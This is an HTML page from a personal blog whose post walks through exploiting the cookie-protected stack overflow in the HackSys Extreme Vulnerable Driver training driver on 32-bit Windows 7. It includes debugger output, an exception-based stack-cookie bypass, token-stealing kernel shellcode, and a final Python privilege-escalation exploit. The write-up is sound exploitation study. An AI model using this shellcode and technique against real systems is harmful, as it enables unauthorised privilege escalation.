@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>HEVD Stack Overflow GS</title>
+  <meta property="og:title" content="HEVD Stack Overflow GS" />
+  <meta name="twitter:title" content="HEVD Stack Overflow GS" />
+  <meta name="description" content="Lately, I&#39;ve decided to play around with HackSys Extreme Vulnerable Driver (HEVD) for fun. It&#39;s a great way to familiarize yourself with Windows exploitation. In this blog post, I&#39;ll show how to exploit the stack overflow that is protected with /GS stack cookies on Windows 7 SP1 32 bit. You can find the source code here. It has a few more exploits written and a Win10 pre-anniversary version of the regular stack buffer overflow vulnerability.">
+  <meta property="og:description" content="Lately, I&#39;ve decided to play around with HackSys Extreme Vulnerable Driver (HEVD) for fun. It&#39;s a great way to familiarize yourself with Windows exploitation. In this blog post, I&#39;ll show how to exploit the stack overflow that is protected with /GS stack cookies on Windows 7 SP1 32 bit. You can find the source code here. It has a few more exploits written and a Win10 pre-anniversary version of the regular stack buffer overflow vulnerability.">
+  <meta name="twitter:description" content="Lately, I&#39;ve decided to play around with HackSys Extreme Vulnerable Driver (HEVD) for fun. It&#39;s a great way to familiarize yourself with Windows exploitation. In this blog post, I&#39;ll show how to …">
+  <meta name="author" content="klue"/>
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@kedyliu" />
+  <meta name="twitter:creator" content="@kedyliu" />
+  <meta property="og:url" content="https://klue.github.io/blog/2017/09/hevd_stack_gs/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="klue-less thoughts" />
+
+  <meta name="generator" content="Hugo 0.30.2" />
+  <link rel="canonical" href="https://klue.github.io/blog/2017/09/hevd_stack_gs/" />
+  <link rel="alternate" href="https://klue.github.io/index.xml" type="application/rss+xml" title="klue-less thoughts">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://klue.github.io//css/main.css" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+  <link rel="stylesheet" href="https://klue.github.io//css/pygment_highlights.css" />
+  <link rel="stylesheet" href="https://klue.github.io//css/highlight.min.css" /><link href="/css/prism.css" rel="stylesheet" />
+
+</head>
+
+
+  <body>
+
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://klue.github.io/">klue-less thoughts</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="about" href="/about/">about</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    <div class="avatar-container">
+      <div class="avatar-img-border">
+        
+      </div>
+    </div>
+
+  </div>
+</nav>
+
+
+
+
+    
+  
+  
+  
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              <h1>HEVD Stack Overflow GS</h1>
+                
+                
+                  <span class="post-meta">
+  Posted on September 5, 2017
+  
+</span>
+
+
+                
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+
+    <div class="container" role="main">
+      
+        <div class="row">
+  <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+    <article role="main" class="blog-post">
+      <p>Lately, I've decided to play around with <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSys Extreme Vulnerable Driver
+(HEVD)</a> for fun.
+It's a great way to familiarize yourself with Windows exploitation. In this
+blog post, I'll show how to exploit the stack overflow that is protected with
+<a href="https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check">/GS stack
+cookies</a>
+on Windows 7 SP1 32 bit. You can find the <a href="https://github.com/klue/hevd">source code
+here</a>. It has a few more exploits written and a
+Win10 pre-anniversary version of the regular stack buffer overflow
+vulnerability.</p>
+
+<h2 id="triggering-the-vulnerable-function">Triggering the Vulnerable Function</h2>
+
+<p>To start, we need to find the
+<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa363219(v=vs.85).aspx">ioctl</a>
+dispatch routine in HEVD. Looking for the
+<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/irp-mj-device-control"><code>IRP_MJ_DEVICE_CONTROL</code></a>
+<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/i-o-request-packets">IRP</a>,
+we see that the dispatch function can be found at <code>hevd+508e</code>.</p>
+
+<pre><code class="language-text">kd&gt; !drvobj hevd 2
+Driver object (852b77f0) is for:
+ \Driver\HEVD
+DriverEntry:   995cb129	HEVD
+DriverStartIo: 00000000	
+DriverUnload:  995ca016	HEVD
+AddDevice:     00000000	
+
+Dispatch routines:
+[00] IRP_MJ_CREATE                      995c9ff2	HEVD+0x4ff2
+[01] IRP_MJ_CREATE_NAMED_PIPE           995ca064	HEVD+0x5064
+...
+[0e] IRP_MJ_DEVICE_CONTROL              995ca08e	HEVD+0x508e
+[0f] IRP_MJ_INTERNAL_DEVICE_CONTROL     995ca064	HEVD+0x5064
+[10] IRP_MJ_SHUTDOWN                    995ca064	HEVD+0x5064
+[11] IRP_MJ_LOCK_CONTROL                995ca064	HEVD+0x5064
+[12] IRP_MJ_CLEANUP                     995ca064	HEVD+0x5064
+[13] IRP_MJ_CREATE_MAILSLOT             995ca064	HEVD+0x5064
+[14] IRP_MJ_QUERY_SECURITY              995ca064	HEVD+0x5064
+[15] IRP_MJ_SET_SECURITY                995ca064	HEVD+0x5064
+...
+</code></pre>
+
+<p>Finding the ioctl request number requires very light reverse engineering. We
+want to end up eventually at <code>hevd+515a</code>. At <code>hevd+50b4</code>, the request number is
+subtracted by <code>222003h</code>. If it was <code>222003h</code>, then jump to <code>hevd+5172</code>, or else
+fall through to <code>hevd+50bf</code>. In this basic block, our ioctl request number is
+subtracted by 4. If the result is 0, we are where we want to be. Therefore, our
+ioctl number should be <code>222007h</code>.
+<figure><img src="/images/hevd_stack_gs-finding_ioctl_num.png" alt="Finding ioctl number"></figure></p>
+
+<p>Eventually, a <code>memcpy</code> is reached where the calling function does not check the
+copy size.
+<figure><img src="/images/hevd_stack_gs-vulnerable_code.png" alt="Vulnerable code"></figure></p>
+
+<p>To give the overflow code a quick run, we call it with benign input using the
+code below. You can find the implementation of <code>mmap</code> and <code>write</code> in the full
+source code.</p>
+
+<pre><code class="language-python">def trigger_stackoverflow_gs(addr, size):
+    dwReturn = c_ulong()
+    driver_handle = kernel32.CreateFileW(DEVICE_NAME,
+                                         GENERIC_READ | GENERIC_WRITE,
+                                         0, None, OPEN_EXISTING, 0, None)
+    if not driver_handle or driver_handle == -1:
+        sys.exit()
+
+    print &quot;[+] IOCTL: 0x222007&quot;
+    dev_ioctl = kernel32.DeviceIoControl(driver_handle, 0x222007,
+                                         addr, size,
+                                         None, 0,
+                                         byref(dwReturn), None)
+
+m = mmap()
+write(m, 'A'*10)
+trigger_stackoverflow_gs(m, 10)
+</code></pre>
+
+<p>In WinDbg, the debug output confirms that we are calling the right ioctl.</p>
+
+<p><img src="/images/hevd_stack_gs-sample_run.png" width="60%" height="60%"/></p>
+
+<p>From the figure, we can see that the kernel buffer is 0x200 in size so if we
+run a PoC again, but with 0x250 <code>A</code>s, we should overflow the stack cookie and
+blue screens our VM.</p>
+
+<p><figure><img src="/images/hevd_stack_gs-stack_cookie_overwrite_confirmation.png" alt="Overwriting stack cookie"></figure></p>
+
+<p>Indeed, the bugcheck tells us that the system crashed due to a stack buffer
+overflow. Stack cookies in Windows are first XORed with <code>ebp</code> before they're
+stored on the stack. If we take the cookie in the bugcheck, and XOR it with
+<code>41414141</code>, the result should resemble a stack address. Specifically, it should
+be the stack base pointer for <code>hevd+48da</code>.</p>
+
+<pre><code class="language-text">kd&gt; ? e9d25b91 ^ 41414141
+Evaluate expression: -1466754352 = a8931ad0
+</code></pre>
+
+<h2 id="bypassing-stack-cookies">Bypassing Stack Cookies</h2>
+
+<p>A common way to bypass stack cookies, introduced by <a href="https://dl.packetstormsecurity.net/papers/bypass/defeating-w2k3-stack-protection.pdf">David
+Litchfield</a>,
+is to cause the program to throw an exception before the stack cookie is
+checked at the end of the function. This works because when an exception
+occurs, the stack cookie is not checked.</p>
+
+<blockquote>
+<p>There are two ways [generating an exception] might happen--one we can control
+and the other is dependent of the code of the vulnerable function. In the
+latter case, if we overflow other data, for example parameters that were
+pushed onto the stack to the vulnerable function and these are referenced
+before the cookie check is performed then we could cause an exception here by
+setting this data to something that will cause an exception. If the code of
+the vulnerable function has been written in such a way that no opportunity
+exists to do this, then we have to attempt to generate our own exception. We
+can do this by attempting to write beyond the end of the stack.</p>
+</blockquote>
+
+<p>For us, it's easy because the vulnerable function uses <code>memcpy</code>. We can simply
+force <code>memcpy</code> to segfault by letting it continue copying the source buffer all
+the way to unmapped memory.</p>
+
+<p>I use my <code>mmap</code> function to map two adjacent pages, then <code>munmap</code> to unmap the
+second page. <code>mmap</code> and <code>munmap</code> are just simple wrappers I wrote for
+<a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff566416(v=vs.85).aspx"><code>NtAllocateVirtualMemory</code></a>
+and
+<a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff566460(v=vs.85).aspx"><code>NtFreeVirtualMemory</code></a>
+respectively. The idea is to place the source buffer at the end of the mapped
+page that was mapped, and have the vulnerable <code>memcpy</code> read off into the
+unmapped page to cause an exception.</p>
+
+<p>To test this, we'll use the PoC code below.</p>
+
+<pre><code class="language-python">m = mmap(size=0x2000)
+munmap(m+0x1000)
+
+trigger_stackoverflow_gs(m+0x1000-0x250, 0x251)
+</code></pre>
+
+<p>Back in the debugger, we can observe that an exception was thrown and <code>eip</code> was
+overwritten as a result of the exception handler being overwritten.
+<figure><img src="/images/hevd_stack_gs-exception_handler_overwrite_confirmation.png" alt="Exception handler crash"></figure></p>
+
+<p>The next step is to find the offset of the <code>A</code>s so we can control <code>eip</code> to
+point to shellcode. You can use a binary search type way to find the offset,
+but an easier method is to use a <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn
+sequence</a> as the payload. I
+usually use Metasploit's
+<a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb"><code>pattern_create.rb</code></a>
+and
+<a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb"><code>pattern_offset.rb</code></a>
+for finding the exact offset in my buffer.</p>
+
+<p><figure><img src="/images/hevd_stack_gs-pattern_create_crash.png" alt="Exception handler crash patter_create.rb"></figure></p>
+
+<p>The figure above shows us <code>41367241</code> overwrites the exception handler address
+and so also <code>eip</code>.</p>
+
+<pre><code class="language-text">kd&gt; .formats 41367241
+Evaluate expression:
+  Hex:     41367241
+  Decimal: 1094087233
+  Octal:   10115471101
+  Binary:  01000001 00110110 01110010 01000001
+  Chars:   A6rA
+  Time:    Wed Sep  1 18:07:13 2004
+  Float:   low 11.4029 high 0
+  Double:  5.40551e-315
+</code></pre>
+
+<p>Reversing the order due to endianness, we get <code>Ar6A</code> which <code>pattern_offset.rb</code>
+tells us is offset 528 (0x210). Therefore, our source buffer will be of size
+0x210+4, where the 4 is due to the address of our shellcode.</p>
+
+<h2 id="constructing-shellcode">Constructing Shellcode</h2>
+
+<p>Since there is 0x1000-0x210-4 unused space in our allocated page, we can just
+put our shellcode in the beginning of the page. I use common Windows token
+stealing shellcode that basically iterates through the <code>_EPROCESS</code>s, looks for
+the SYSTEM process, and copies the SYSTEM process' token. Additionally, for
+convenience in breaking at the shellcode, I prepend the shellcode with a
+breakpoint (<code>\xcc</code>).</p>
+
+<pre><code class="language-text">\xcc\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\x8b\x80\xb8\x00
+\x00\x00\x2d\xb8\x00\x00\x00\x83\xb8\xb4\x00\x00\x00\x04\x75\xec\x8b\x90\xf8
+\x00\x00\x00\x89\x91\xf8\x00\x00\x00
+</code></pre>
+
+<p>Our shellcode still isn't complete yet; the shellcode doesn't know where to
+return to after it executes. To search for a return address, let's inspect the
+call stack in the debugger when the shellcode executes.</p>
+
+<pre><code class="language-text">kd&gt; k
+ # ChildEBP RetAddr
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+00 a88cf114 82ab3622 0x1540000
+01 a88cf138 82ab35f4 nt!ExecuteHandler2+0x26
+02 a88cf15c 82ae73b5 nt!ExecuteHandler+0x24
+03 a88cf1f0 82af005c nt!RtlDispatchException+0xb6
+04 a88cf77c 82a79dd6 nt!KiDispatchException+0x17c
+05 a88cf7e4 82a79d8a nt!CommonDispatchException+0x4a
+06 a88cf868 995c9969 nt!KiExceptionExit+0x192
+07 a88cf86c a88cf8b4 HEVD+0x4969
+08 a88cf870 01540dec 0xa88cf8b4
+09 a88cf8b4 41414141 0x1540dec
+0a a88cf8b8 41414141 0x41414141
+0b a88cf8bc 41414141 0x41414141
+...
+51 a88cfad0 995c99ca 0x41414141
+52 a88cfae0 995ca16d HEVD+0x49ca
+53 a88cfafc 82a72593 HEVD+0x516d
+54 a88cfb14 82c6699f nt!IofCallDriver+0x63
+</code></pre>
+
+<p><code>hevd+4969</code> is the instruction address after the <code>memcpy</code>, but we can't return
+here because the portion of stack the remaining code uses  is corrupted. Fixing
+the stack to the correct values would be extremely annoying. Instead, returning
+to <code>hevd+49ca</code> which is the return address of the stack frame right below
+<code>hevd+4969</code> makes more sense.</p>
+
+<p>However, if you adjust the stack and return to <code>hevd+49ca</code>, you'll still get a
+crash. The problem is at <code>hevd+5260</code> where <code>edi+0x1c</code> is dereferenced. <code>edi</code> at
+this point is 0 because registers are XORed with themselves before the
+exception handler assumes control and neither the program nor our shellcode
+touched <code>edi</code>.</p>
+
+<p><center>
+<img src="/images/hevd_stack_gs-__SEH_epilog4.png" width="40%" height="40%"/>
+</center></p>
+
+<p>In a normal execution, <code>edi</code> and other registers are restored in
+<code>__SEH_epilog4</code>. These values are of course restored from the stack. Taking
+<code>a88cf86c</code> from the stack trace before, we can dump and attempt to find the
+restore values. They're actually are quite easy to find here because
+<code>hevd+5dcc</code> is quite easy to spot. <code>hevd+5dcc</code> is the address of the debug
+print string which is restored into <code>ebx</code>.</p>
+
+<pre><code class="language-text">kd&gt; dds a88cf86c
+a88cf86c  995c9969 HEVD+0x4969
+a88cf870  a88cf8b4
+a88cf874  01540dec
+a88cf878  00000218
+a88cf87c  995ca760 HEVD+0x5760
+a88cf880  995ca31a HEVD+0x531a
+a88cf884  00000200
+a88cf888  995ca338 HEVD+0x5338
+a88cf88c  a88cf8b4
+a88cf890  995ca3a2 HEVD+0x53a2
+a88cf894  00000218
+a88cf898  995ca3be HEVD+0x53be
+a88cf89c  01540dec
+a88cf8a0  31d15d0b
+a88cf8a4  8c843f68 &lt;-- edi
+a88cf8a8  8c843fd8 &lt;-- esi
+a88cf8ac  995cadcc HEVD+0x5dcc &lt;-- ebx
+a88cf8b0  455f5359
+a88cf8b4  41414141
+a88cf8b8  41414141
+</code></pre>
+
+<p>To obtain the offset of <code>edi</code>, just subtract <code>esp</code> from the current address of
+the restore value.</p>
+
+<pre><code class="language-text">kd&gt; ? a88cf8a4 - esp
+Evaluate expression: 1932 = 0000078c
+kd&gt; dds a88cfad0 la
+a88cfad0  a88cfae0
+a88cfad4  995c99ca HEVD+0x49ca
+a88cfad8  01540dec
+a88cfadc  00000218
+a88cfae0  a88cfafc
+a88cfae4  995ca16d HEVD+0x516d
+a88cfae8  8c843f68
+a88cfaec  8c843fd8
+a88cfaf0  86c3c398
+a88cfaf4  8586f5f0
+kd&gt; ? a88cfad0 - esp
+Evaluate expression: 2488 = 000009b8
+</code></pre>
+
+<p>Similarly, finding the offset to return to is found by obtaining the difference
+of <code>a88cfad0</code> and <code>esp</code>.</p>
+
+<p>Lastly, our shellcode should <code>pop ebp; ret 8;</code> which results in</p>
+
+<pre><code class="language-text">start:
+  xor eax, eax;
+  mov eax,dword ptr fs:[eax+0x124]; # nt!_KPCR.PcrbData.CurrentThread
+  mov eax,dword ptr [eax+0x50];     # nt!_KTHREAD.ApcState.Process
+  mov ecx,eax;                      # Store unprivileged _EPROCESS in ecx
+loop:
+  mov eax,dword ptr [eax+0xb8];     # Next nt!_EPROCESS.ActiveProcessLinks.Flink
+  sub eax, 0xb8;                    # Back to the beginning of _EPROCESS
+  cmp dword ptr [eax+0xb4],0x04;    # SYSTEM process? nt!_EPROCESS.UniqueProcessId
+  jne loop;
+stealtoken:
+  mov edx,dword ptr [eax+0xf8];     # Get SYSTEM nt!_EPROCESS.Token
+  mov dword ptr [ecx+0xf8],edx;     # Copy token
+restore:
+  mov edi, [esp+0x78c];             # edi irq
+  mov esi, [esp+0x790];             # esi
+  mov ebx, [esp+0x794];             # move print string into ebx
+  add esp, 0x9b8;
+  pop ebp;
+  ret 0x8;
+</code></pre>
+
+<h2 id="gaining-nt-authoritysystem">Gaining NT Authority\SYSTEM</h2>
+
+<p>Putting everything together, the final exploit looks like this.</p>
+
+<pre><code class="language-python">m = mmap(size=0x2000)
+munmap(m+0x1000)
+size = 0x210+4
+
+sc = '\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x83\xb8\xb4\x00\x00\x00\x04\x75\xec\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x8b\xbc\x24\x8c\x07\x00\x00\x8b\xb4\x24\x90\x07\x00\x00\x8b\x9c\x24\x94\x07\x00\x00\x81\xc4\xb8\x09\x00\x00\x5d\xc2\x08\x00'
+write(m, sc + 'A'*(0x1000-4-len(sc)) + struct.pack(&quot;&lt;I&quot;, m))
+trigger_stackoverflow_gs(m+0x1000-size, size+1)
+
+print '\n[+] Privilege Escalated\n'
+os.system('cmd.exe')
+</code></pre>
+
+<p>And that should give us:
+<figure><img src="/images/hevd_stack_gs-priv_esc.png" alt="nt authority\system"></figure></p>
+
+    </article>
+
+    <ul class="pager blog-pager">
+      
+        <li class="previous">
+          <a href="https://klue.github.io/blog/2017/04/macos_kernel_debugging_vbox/" data-toggle="tooltip" data-placement="top" title="Debugging macOS Kernel using VirtualBox">&larr; Previous Post</a>
+        </li>
+      
+      
+    </ul>
+
+    
+      
+        <div class="disqus-comments">
+          <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "klueless" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+      
+    
+
+  </div>
+</div>
+
+      
+    </div>
+
+    <footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/klue" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/kedyliu" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://linkedin.com/in/kedyliu" title="LinkedIn">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            <a href="https://klue.github.io/index.xml" title="RSS">
+              <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x"></i>
+                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          klue
+          &nbsp;&bull;&nbsp;
+          2017
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://klue.github.io/">klue-less thoughts</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="http://gohugo.io">Hugo v0.30.2</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/contrib/auto-render.min.js" integrity="sha384-dq1/gEHSxPZQ7DdrM82ID4YVol9BYyU7GbWlIwnwyPzotpoc57wDw/guX8EaYGPx" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+<script src="https://klue.github.io//js/main.js"></script>
+<script src="https://klue.github.io//js/highlight.min.js"></script>
+<script> hljs.initHighlightingOnLoad(); </script>
+<script> renderMathInElement(document.body); </script>
+
+
+
+
+
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-92808803-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script src="/js/prism.js"></script>
+
+
+
+  </body>
+</html>
